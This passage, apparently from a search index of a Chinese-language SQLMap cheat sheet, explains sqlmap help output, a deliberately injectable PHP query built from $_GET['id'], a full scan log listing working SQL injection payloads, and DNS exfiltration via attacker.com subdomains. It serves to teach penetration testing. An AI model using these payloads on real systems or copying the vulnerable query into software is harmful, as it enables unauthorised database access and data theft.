\u6e17\u6f0f\u201d\u652f\u6301\u5e26\u5916 SQLi\uff0c\u5176\u4e2d\u901a\u8fc7 DNS \u6d41\u91cf\u68c0\u7d22\u8bf7\u6c42\u7684\u67e5\u8be2\u3002</p> <p>\u901a\u8fc7\u5728\u53d7\u63a7\u57df\uff08\u4f8b\u5982 <code>.attacker.com</code>\uff09\u7684 DNS \u670d\u52a1\u5668\u4e0a\u8fd0\u884c SQLMap\uff0cSQLMap \u53ef\u4ee5\u901a\u8fc7\u5f3a\u5236\u670d\u52a1\u5668\u8bf7\u6c42\u4e0d\u5b58\u5728\u7684\u5b50\u57df\uff08\u4f8b\u5982 <code>foo.attacker.com</code>\uff09\u6765\u6267\u884c\u653b\u51fb\uff0c\u5176\u4e2d foo \u662f\u6211\u4eec\u60f3\u8981\u63a5\u6536\u7684 SQL \u54cd\u5e94\u3002\u7136\u540e SQLMap \u53ef\u4ee5\u6536\u96c6\u8fd9\u4e9b\u9519\u8bef\u7684 DNS \u8bf7\u6c42\u5e76\u6536\u96c6 foo \u90e8\u5206\uff0c\u4ee5\u5f62\u6210\u6574\u4e2a SQL \u54cd\u5e94\u3002</p>"},{"location":"CheetSheet/SQLMAP/2%E3%80%81SQLMap%20%E5%85%A5%E9%97%A8/","title":"2\u3001SQLMap \u5165\u95e8","text":"<p>\u5728\u5f00\u59cb\u4f7f\u7528 SQLMap \u65f6\uff0c\u65b0\u7528\u6237\u7684\u7b2c\u4e00\u7ad9\u901a\u5e38\u662f\u7a0b\u5e8f\u7684\u5e2e\u52a9\u6d88\u606f\u3002\u4e3a\u4e86\u5e2e\u52a9\u65b0\u7528\u6237\uff0c\u6709\u4e24\u4e2a\u7ea7\u522b\u7684\u5e2e\u52a9\u6d88\u606f\u5217\u8868\uff1a</p> <ul> <li><code>Basic Listing</code>\u4ec5\u663e\u793a\u57fa\u672c\u9009\u9879\u548c\u5f00\u5173\uff0c\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u5c31\u8db3\u591f\u4e86\uff08\u5f00\u5173<code>-h</code>\uff09\uff1a</li> </ul> <pre><code>$ sqlmap -h\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.9#stable}\n|_ -| . [\"]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\nUsage: python3 sqlmap [options]\n\nOptions:\n  -h, --help            Show basic help message and exit\n  -hh                   Show advanced help message and exit\n  --version             Show program's version number and exit\n  -v VERBOSE            Verbosity level: 0-6 (default 1)\n\n  Target:\n    At least one of these options has to be provided to define the\n    target(s)\n\n    -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n    -g GOOGLEDORK       Process Google dork results as target URLs\n...SNIP...\n</code></pre> <ul> <li><code>Advanced Listing</code>\u663e\u793a\u6240\u6709\u9009\u9879\u548c\u5f00\u5173\uff08\u5f00\u5173<code>-hh</code>\uff09\uff1a</li> </ul> <pre><code>$ sqlmap -hh\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.4.9#stable}\n|_ -| . [.]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\nUsage: python3 sqlmap [options]\n\nOptions:\n  -h, --help            Show basic help message and exit\n  -hh                   Show advanced help message and exit\n  --version             Show program's version number and exit\n  -v VERBOSE            Verbosity level: 0-6 (default 1)\n\n  Target:\n    At least one of these options has to be provided to define the\n    target(s)\n\n    -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n    -d DIRECT           Connection string for direct database connection\n    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file\n    -m BULKFILE         Scan multiple targets given in a textual file\n    -r REQUESTFILE      Load HTTP request from a file\n    -g GOOGLEDORK       Process Google dork results as target URLs\n    -c CONFIGFILE       Load options from a configuration INI file\n\n  Request:\n    These options can be used to specify how to connect to the target URL\n\n    -A AGENT, --user..  HTTP User-Agent header value\n    -H HEADER, --hea..  Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n    --method=METHOD     Force usage of given HTTP method (e.g. PUT)\n    --data=DATA         Data string to be sent through POST (e.g. \"id=1\")\n    --param-del=PARA..  Character used for splitting parameter values (e.g. &amp;)\n    --cookie=COOKIE     HTTP Cookie header value (e.g. \"PHPSESSID=a8d127e..\")\n    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)\n...SNIP...\n</code></pre> <p>\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u5efa\u8bae\u7528\u6237\u67e5\u9605\u9879\u76ee\u7684wiki\uff0c\u56e0\u4e3a\u5b83\u4ee3\u8868\u4e86 SQLMap \u4f7f\u7528\u7684\u5b98\u65b9\u624b\u518c\u3002</p>"},{"location":"CheetSheet/SQLMAP/2%E3%80%81SQLMap%20%E5%85%A5%E9%97%A8/#_1","title":"\u57fa\u672c\u573a\u666f","text":"<p>\u5728\u4e00\u4e2a\u7b80\u5355\u7684\u573a\u666f\u4e2d\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u901a\u8fc7 <code>GET</code> \u53c2\u6570\uff08\u4f8b\u5982 <code>id</code>\uff09\u8bbf\u95ee\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u7f51\u9875\u3002\u7136\u540e\u4ed6\u4eec\u60f3\u6d4b\u8bd5\u7f51\u9875\u662f\u5426\u53d7\u5230 SQL \u6ce8\u5165\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002\u5982\u679c\u662f\u8fd9\u6837\uff0c\u4ed6\u4eec\u4f1a\u60f3\u5229\u7528\u5b83\uff0c\u4ece\u540e\u7aef\u6570\u636e\u5e93\u4e2d\u68c0\u7d22\u5c3d\u53ef\u80fd\u591a\u7684\u4fe1\u606f\uff0c\u751a\u81f3\u5c1d\u8bd5\u8bbf\u95ee\u5e95\u5c42\u6587\u4ef6\u7cfb\u7edf\u5e76\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002\u6b64\u573a\u666f\u7684 SQLi \u6613\u53d7\u653b\u51fb\u7684 PHP \u4ee3\u7801\u793a\u4f8b\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$link = mysqli_connect($host, $username, $password, $database, 3306);\n$sql = \"SELECT * FROM users WHERE id = \" . $_GET[\"id\"] . \" LIMIT 0, 1\";\n$result = mysqli_query($link, $query);\nif (!$result)\n    die(\"&lt;b&gt;SQL error:&lt;/b&gt; \". mysqli_error($link) . \"&lt;br&gt;\\n\");\n</code></pre> <p>\u7531\u4e8e\u4e3a\u6613\u53d7\u653b\u51fb\u7684 SQL \u67e5\u8be2\u542f\u7528\u4e86\u9519\u8bef\u62a5\u544a\uff0c\u56e0\u6b64\u5728\u51fa\u73b0\u4efb\u4f55 SQL \u67e5\u8be2\u6267\u884c\u95ee\u9898\u65f6\uff0c\u5c06\u4f5c\u4e3a Web \u670d\u52a1\u5668\u54cd\u5e94\u7684\u4e00\u90e8\u5206\u8fd4\u56de\u6570\u636e\u5e93\u9519\u8bef\u3002\u8fd9\u79cd\u60c5\u51b5\u7b80\u5316\u4e86 SQLi \u68c0\u6d4b\u8fc7\u7a0b\uff0c\u7279\u522b\u662f\u5728\u624b\u52a8\u53c2\u6570\u503c\u7be1\u6539\u7684\u60c5\u51b5\u4e0b\uff0c\u56e0\u4e3a\u5f88\u5bb9\u6613\u8bc6\u522b\u7531\u6b64\u4ea7\u751f\u7684\u9519\u8bef\uff1a</p> <p>![[Pasted image 20221201220618.png]]</p> <p>\u8981\u9488\u5bf9\u4f4d\u4e8e\u793a\u4f8b URL \u7684\u6b64\u793a\u4f8b\u8fd0\u884c SQLMap\u00a0<code>http://www.example.com/vuln.php?id=1</code>\uff0c\u5c06\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/vuln.php?id=1\" --batch\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.9}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 22:26:45 /2020-09-09/\n\n[22:26:45] [INFO] testing connection to the target URL\n[22:26:45] [INFO] testing if the target URL content is stable\n[22:26:46] [INFO] target URL content is stable\n[22:26:46] [INFO] testing if GET parameter 'id' is dynamic\n[22:26:46] [INFO] GET parameter 'id' appears to be dynamic\n[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks\n[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y\n[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[22:26:46] [WARNING] reflective value(s) found and filtering out\n[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"luther\")\n[22:26:46] [INFO] testing 'Generic inline queries'\n[22:26:46] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[22:26:46] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n...SNIP...\n[22:26:46] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable \n[22:26:46] [INFO] testing 'MySQL inline queries'\n[22:26:46] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (comment)'\n[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       \n...SNIP...\n[22:26:46] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'\n[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[22:26:56] [INFO] target URL appears to have 3 columns in query\n[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1 AND 8814=8814\n\n    Type: error-based\n    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -\n---\n[22:26:56] [INFO] the back-end DBMS is MySQL\nweb application technology: PHP 5.2.6, Apache 2.2.9\nback-end DBMS: MySQL &gt;= 5.0\n[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'\n\n[*] ending @ 22:26:57 /2020-09-09/\n</code></pre> <p>\u6ce8\u610f\uff1a\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u9009\u9879\u201c-u\u201d\u7528\u4e8e\u63d0\u4f9b\u76ee\u6807 URL\uff0c\u800c\u5f00\u5173\u201c--batch\u201d\u7528\u4e8e\u901a\u8fc7\u81ea\u52a8\u9009\u62e9\u4f7f\u7528\u9ed8\u8ba4\u9009\u9879\u6765\u8df3\u8fc7\u4efb\u4f55\u5fc5\u9700\u7684\u7528\u6237\u8f93\u5165\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/","title":"3\u3001SQLMap \u8f93\u51fa\u8bf4\u660e","text":"<p>sqlmap \u8f93\u51fa\u5728\u5176\u626b\u63cf\u8fc7\u7a0b\u4e2d\u5411\u6211\u4eec\u5c55\u793a\u4e86\u5f88\u591a\u4fe1\u606f\u3002\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u5bf9\u7406\u89e3\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u4f1a\u6307\u5bfc\u6211\u4eec\u5b8c\u6210\u81ea\u52a8 SQL \u6ce8\u5165\u8fc7\u7a0b\u3002\u8fd9\u51c6\u786e\u5730\u5411\u6211\u4eec\u5c55\u793a\u4e86 SQLMap \u6b63\u5728\u5229\u7528\u7684\u6f0f\u6d1e\u7c7b\u578b\uff0c\u8fd9\u6709\u52a9\u4e8e\u6211\u4eec\u62a5\u544a Web \u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u54ea\u79cd\u7c7b\u578b\u7684\u6ce8\u5165\u3002\u5982\u679c\u6211\u4eec\u60f3\u5728 SQLMap \u786e\u5b9a\u6ce8\u5165\u7c7b\u578b\u548c\u6613\u53d7\u653b\u51fb\u7684\u53c2\u6570\u540e\u624b\u52a8\u5229\u7528 Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u8fd9\u4e5f\u4f1a\u53d8\u5f97\u5f88\u65b9\u4fbf\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#_1","title":"\u65e5\u5fd7\u6d88\u606f\u8bf4\u660e","text":"<p>\u4ee5\u4e0b\u662f\u5728 SQLMap \u626b\u63cf\u671f\u95f4\u901a\u5e38\u4f1a\u53d1\u73b0\u7684\u4e00\u4e9b\u6700\u5e38\u89c1\u7684\u6d88\u606f\uff0c\u4ee5\u53ca\u4e4b\u524d\u7ec3\u4e60\u4e2d\u7684\u6bcf\u4e2a\u6d88\u606f\u53ca\u5176\u63cf\u8ff0\u7684\u793a\u4f8b\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#url-content-is-stable","title":"URL content is stable","text":"<p>Log Message :</p> <ul> <li>\"target URL content is stable\"</li> </ul> <p>\u8fd9\u610f\u5473\u7740\u5728\u8fde\u7eed\u76f8\u540c\u8bf7\u6c42\u7684\u60c5\u51b5\u4e0b\uff0c\u54cd\u5e94\u4e4b\u95f4\u6ca1\u6709\u91cd\u5927\u53d8\u5316\u3002\u4ece\u81ea\u52a8\u5316\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u5728\u7a33\u5b9a\u54cd\u5e94\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u5bb9\u6613\u53d1\u73b0\u7531\u6f5c\u5728\u7684 SQLi \u5c1d\u8bd5\u5f15\u8d77\u7684\u5dee\u5f02\u3002\u867d\u7136\u7a33\u5b9a\u6027\u5f88\u91cd\u8981\uff0c\u4f46 SQLMap \u5177\u6709\u5148\u8fdb\u7684\u673a\u5236\u6765\u81ea\u52a8\u6d88\u9664\u53ef\u80fd\u6765\u81ea\u6f5c\u5728\u4e0d\u7a33\u5b9a\u76ee\u6807\u7684\u6f5c\u5728\u201c\u566a\u97f3\u201d\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#parameter-appears-to-be-dynamic","title":"Parameter appears to be dynamic","text":"<p>Log Message :</p> <ul> <li>\"GET parameter 'id' appears to be dynamic\"</li> </ul> <p>\u603b\u662f\u5e0c\u671b\u6d4b\u8bd5\u53c2\u6570\u662f\u201c\u52a8\u6001\u7684\u201d\uff0c\u56e0\u4e3a\u5b83\u8868\u660e\u5bf9\u5176\u503c\u6240\u505a\u7684\u4efb\u4f55\u66f4\u6539\u90fd\u4f1a\u5bfc\u81f4\u54cd\u5e94\u53d1\u751f\u53d8\u5316\uff1b\u56e0\u6b64\u8be5\u53c2\u6570\u53ef\u4ee5\u94fe\u63a5\u5230\u6570\u636e\u5e93\u3002\u5982\u679c\u8f93\u51fa\u662f\u201c\u9759\u6001\u7684\u201d\u5e76\u4e14\u6ca1\u6709\u6539\u53d8\uff0c\u5b83\u53ef\u80fd\u8868\u660e\u88ab\u6d4b\u8bd5\u53c2\u6570\u7684\u503c\u6ca1\u6709\u88ab\u76ee\u6807\u5904\u7406\uff0c\u81f3\u5c11\u5728\u5f53\u524d\u4e0a\u4e0b\u6587\u4e2d\u662f\u8fd9\u6837\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#parameter-might-be-injectable","title":"Parameter might be injectable","text":"<p>Log Message:</p> <ul> <li>\"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\"</li> </ul> <p>\u5982\u524d\u6240\u8ff0\uff0cDBMS \u9519\u8bef\u662f\u6f5c\u5728 SQLi \u7684\u826f\u597d\u6307\u793a\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53 SQLMap \u53d1\u9001\u4e00\u4e2a\u6545\u610f\u4f7f\u7528\u7684\u65e0\u6548\u503c\uff08\u4f8b\u5982<code>?id=1\",)..).))'</code>\uff09\u65f6\u51fa\u73b0 MySQL \u9519\u8bef\uff0c\u8fd9\u8868\u660e\u88ab\u6d4b\u8bd5\u7684\u53c2\u6570\u53ef\u80fd\u662f SQLi \u53ef\u6ce8\u5165\u7684\u5e76\u4e14\u76ee\u6807\u53ef\u80fd\u662f MySQL\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e0d\u662f SQLi \u7684\u8bc1\u660e\uff0c\u53ea\u662f\u8868\u660e\u68c0\u6d4b\u673a\u5236\u5fc5\u987b\u5728\u540e\u7eed\u8fd0\u884c\u4e2d\u5f97\u5230\u8bc1\u660e\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#parameter-might-be-vulnerable-to-xss-attacks","title":"Parameter might be vulnerable to XSS attacks","text":"<p><code>Log Message:</code></p> <ul> <li>\"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks\"</li> </ul> <p>\u867d\u7136\u8fd9\u4e0d\u662f\u5b83\u7684\u4e3b\u8981\u76ee\u7684\uff0c\u4f46 SQLMap \u8fd8\u8fd0\u884c\u5feb\u901f\u542f\u53d1\u5f0f\u6d4b\u8bd5\u4ee5\u68c0\u6d4b\u662f\u5426\u5b58\u5728 XSS \u6f0f\u6d1e\u3002\u5728\u4f7f\u7528 SQLMap \u6d4b\u8bd5\u5927\u91cf\u53c2\u6570\u7684\u5927\u89c4\u6a21\u6d4b\u8bd5\u4e2d\uff0c\u62e5\u6709\u8fd9\u4e9b\u7c7b\u578b\u7684\u5feb\u901f\u542f\u53d1\u5f0f\u68c0\u67e5\u975e\u5e38\u597d\uff0c\u5c24\u5176\u662f\u5728\u6ca1\u6709\u53d1\u73b0 SQLi \u6f0f\u6d1e\u7684\u60c5\u51b5\u4e0b\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#back-end-dbms-is","title":"Back-end DBMS is '...'","text":"<p><code>Log Message:</code></p> <ul> <li>\"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\"</li> </ul> <p>\u5728\u6b63\u5e38\u8fd0\u884c\u4e2d\uff0cSQLMap \u6d4b\u8bd5\u6240\u6709\u652f\u6301\u7684 DBMS\u3002\u5982\u679c\u6709\u660e\u786e\u8ff9\u8c61\u8868\u660e\u76ee\u6807\u6b63\u5728\u4f7f\u7528\u7279\u5b9a\u7684 DBMS\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6709\u6548\u8d1f\u8f7d\u7f29\u5c0f\u5230\u8be5\u7279\u5b9a\u7684 DBMS\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#levelrisk-values","title":"Level/risk values","text":"<p><code>Log Message:</code></p> <ul> <li>\"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]\"</li> </ul> <p>\u5982\u679c\u6709\u660e\u786e\u7684\u8ff9\u8c61\u8868\u660e\u76ee\u6807\u4f7f\u7528\u7279\u5b9a\u7684 DBMS\uff0c\u5219\u8fd8\u53ef\u4ee5\u5c06\u9488\u5bf9\u540c\u4e00\u7279\u5b9a DBMS \u7684\u6d4b\u8bd5\u6269\u5c55\u5230\u5e38\u89c4\u6d4b\u8bd5\u4e4b\u5916\u3002 \u8fd9\u57fa\u672c\u4e0a\u610f\u5473\u7740\u4e3a\u8be5\u7279\u5b9a DBMS \u8fd0\u884c\u6240\u6709 SQL \u6ce8\u5165\u6709\u6548\u8d1f\u8f7d\uff0c\u800c\u5982\u679c\u672a\u68c0\u6d4b\u5230 DBMS\uff0c\u5219\u53ea\u4f1a\u6d4b\u8bd5\u9876\u90e8\u6709\u6548\u8d1f\u8f7d\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#reflective-values-found","title":"Reflective values found","text":"<p><code>Log Message:</code></p> <ul> <li>\"reflective value(s) found and filtering out\"</li> </ul> <p>\u53ea\u662f\u8b66\u544a\u5728\u54cd\u5e94\u4e2d\u53d1\u73b0\u4e86\u90e8\u5206\u4f7f\u7528\u7684\u6709\u6548\u8d1f\u8f7d\u3002\u8fd9\u79cd\u884c\u4e3a\u53ef\u80fd\u4f1a\u7ed9\u81ea\u52a8\u5316\u5de5\u5177\u5e26\u6765\u95ee\u9898\uff0c\u56e0\u4e3a\u5b83\u4ee3\u8868\u4e86\u5783\u573e\u3002\u4f46\u662f\uff0cSQLMap \u5177\u6709\u8fc7\u6ee4\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u6bd4\u8f83\u539f\u59cb\u9875\u9762\u5185\u5bb9\u4e4b\u524d\u5220\u9664\u6b64\u7c7b\u5783\u573e\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#parameter-appears-to-be-injectable","title":"Parameter appears to be injectable","text":"<p><code>Log Message:</code></p> <ul> <li>\"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"luther\")\"</li> </ul> <p>\u6b64\u6d88\u606f\u8868\u660e\u8be5\u53c2\u6570\u4f3c\u4e4e\u662f\u53ef\u6ce8\u5165\u7684\uff0c\u4f46\u4ecd\u6709\u53ef\u80fd\u662f\u8bef\u62a5\u3002\u5728\u57fa\u4e8e\u5e03\u5c14\u7684\u76f2\u6ce8\u548c\u7c7b\u4f3c\u7684 SQLi \u7c7b\u578b\uff08\u4f8b\u5982\uff0c\u57fa\u4e8e\u65f6\u95f4\u7684\u76f2\u6ce8\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u8bef\u62a5\u7684\u53ef\u80fd\u6027\u5f88\u9ad8\uff0c\u5728\u8fd0\u884c\u7ed3\u675f\u65f6\uff0cSQLMap \u6267\u884c\u5e7f\u6cdb\u7684\u6d4b\u8bd5\uff0c\u5305\u62ec\u7528\u4e8e\u5220\u9664\u7684\u7b80\u5355\u903b\u8f91\u68c0\u67e5\u7684\u5047\u9633\u6027\u7ed3\u679c\u3002</p> <p>\u6b64\u5916\uff0c<code>with --string=\"luther\"</code>\u8868\u793a SQLMap \u8bc6\u522b\u5e76\u4f7f\u7528\u54cd\u5e94\u4e2d\u5e38\u91cf\u5b57\u7b26\u4e32\u503c\u7684\u51fa\u73b0<code>luther</code>\u4ee5\u4e0e\u54cd\u5e94\u533a\u5206\u5f00<code>TRUE</code>\u6765<code>FALSE</code>\u3002\u8fd9\u662f\u4e00\u4e2a\u91cd\u8981\u7684\u53d1\u73b0\uff0c\u56e0\u4e3a\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4e0d\u9700\u8981\u4f7f\u7528\u9ad8\u7ea7\u5185\u90e8\u673a\u5236\uff0c\u4f8b\u5982\u52a8\u6001/\u53cd\u5c04\u53bb\u9664\u6216\u54cd\u5e94\u7684\u6a21\u7cca\u6bd4\u8f83\uff0c\u8fd9\u4e9b\u4e0d\u80fd\u88ab\u89c6\u4e3a\u8bef\u62a5\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#time-based-comparison-statistical-model","title":"Time-based comparison statistical model","text":"<p><code>Log Message:</code></p> <ul> <li>\"time-based comparison requires a larger statistical model, please wait........... (done)\"</li> </ul> <p>SQLMap \u4f7f\u7528\u7edf\u8ba1\u6a21\u578b\u6765\u8bc6\u522b\u5b9a\u671f\u548c\uff08\u6545\u610f\uff09\u5ef6\u8fdf\u7684\u76ee\u6807\u54cd\u5e94\u3002\u8981\u4f7f\u6b64\u6a21\u578b\u8d77\u4f5c\u7528\uff0c\u9700\u8981\u6536\u96c6\u8db3\u591f\u6570\u91cf\u7684\u5e38\u89c4\u54cd\u5e94\u65f6\u95f4\u3002\u8fd9\u6837\uff0c\u5373\u4f7f\u5728\u9ad8\u5ef6\u8fdf\u7f51\u7edc\u73af\u5883\u4e2d\uff0cSQLMap \u4e5f\u53ef\u4ee5\u7edf\u8ba1\u533a\u5206\u6545\u610f\u5ef6\u8fdf\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#extending-union-query-injection-technique-tests","title":"Extending UNION query injection technique tests","text":"<p><code>Log Message:</code></p> <ul> <li>\"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\"</li> </ul> <p>\u4e0e\u5176\u4ed6 SQLi \u7c7b\u578b\u76f8\u6bd4\uff0cUNION \u67e5\u8be2 SQLi \u68c0\u67e5\u9700\u8981\u66f4\u591a\u8bf7\u6c42\u624d\u80fd\u6210\u529f\u8bc6\u522b\u53ef\u7528\u8d1f\u8f7d\u3002\u4e3a\u4e86\u51cf\u5c11\u6bcf\u4e2a\u53c2\u6570\u7684\u6d4b\u8bd5\u65f6\u95f4\uff0c\u5c24\u5176\u662f\u5f53\u76ee\u6807\u770b\u8d77\u6765\u4e0d\u53ef\u6ce8\u5165\u65f6\uff0c\u8bf7\u6c42\u7684\u6570\u91cf\u88ab\u9650\u5236\u4e3a\u6b64\u7c7b\u68c0\u67e5\u7684\u6052\u5b9a\u503c\uff08\u5373 10\uff09\u3002\u4f46\u662f\uff0c\u5982\u679c\u76ee\u6807\u5f88\u6709\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u653b\u51fb\uff0c\u5c24\u5176\u662f\u5f53\u53d1\u73b0\u53e6\u4e00\u79cd\uff08\u6f5c\u5728\u7684\uff09SQLi \u6280\u672f\u65f6\uff0cSQLMap \u4f1a\u6269\u5c55 UNION \u67e5\u8be2 SQLi \u7684\u9ed8\u8ba4\u8bf7\u6c42\u6570\uff0c\u56e0\u4e3a\u6210\u529f\u7684\u9884\u671f\u66f4\u9ad8\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#technique-appears-to-be-usable","title":"Technique appears to be usable","text":"<p><code>Log Message:</code></p> <ul> <li>\"ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\"</li> </ul> <p>\u4f5c\u4e3a UNION \u67e5\u8be2 SQLi \u7c7b\u578b\u7684\u542f\u53d1\u5f0f\u68c0\u67e5\uff0c\u5728<code>UNION</code>\u53d1\u9001\u5b9e\u9645\u6709\u6548\u8d1f\u8f7d\u4e4b\u524d\uff0c\u68c0\u67e5\u4e00\u79cd\u79f0\u4e3a \u7684\u6280\u672f<code>ORDER BY</code>\u7684\u53ef\u7528\u6027\u3002\u5728\u53ef\u7528\u7684\u60c5\u51b5\u4e0b\uff0cSQLMap \u53ef\u4ee5 <code>UNION</code> \u901a\u8fc7\u6267\u884c\u4e8c\u8fdb\u5236\u641c\u7d22\u65b9\u6cd5\u5feb\u901f\u8bc6\u522b\u6240\u9700\u5217\u7684\u6b63\u786e\u6570\u91cf\u3002</p> 